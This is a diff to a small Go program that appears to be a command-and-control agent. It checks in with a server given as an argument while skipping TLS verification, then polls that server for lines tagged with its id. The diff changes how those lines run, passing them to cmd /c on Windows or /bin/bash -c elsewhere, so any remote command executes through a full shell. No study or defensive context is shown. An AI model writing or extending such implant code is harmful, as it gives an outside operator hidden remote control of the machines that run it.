@@ -19,15 +19,11 @@ data := "Hello From Go"
 sEnc := b64.StdEncoding.EncodeToString([]byte(data))
 id := os.Args[1]
 
-fmt.Println(sEnc)
-
 http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
 _, err := http.Get(os.Args[2]+"/res.php?id="+id+"&res=" + sEnc )
 if err != nil {
 	fmt.Println(err)
 }
-
-
 
 
 for{
@@ -53,13 +49,19 @@ resBody, err := ioutil.ReadAll(res.Body)
 
 cmds := string(resBody)
 
-
-
 for _, line := range strings.Split(strings.TrimRight(cmds, "\n"), "\n") {
       if strings.Contains(string(line), string(id)){
       fmt.Println(line)
-      cmd := strings.Join(strings.Split(line, ":")[1:], ":")
-      Output, err := exec.Command(cmd).Output()
+      var syscmd string
+      var sysparam string
+      syscmd = "cmd"
+      sysparam = "/c"
+      cmdline := strings.Join(strings.Split(line, ":")[1:], ":")
+      if string(os.PathSeparator) == "/" {
+      syscmd = "/bin/bash"
+      sysparam = "-c"
+      }
+      Output, err := exec.Command(syscmd, sysparam, cmdline).Output()
       if err != nil {
         fmt.Println(err)
       }
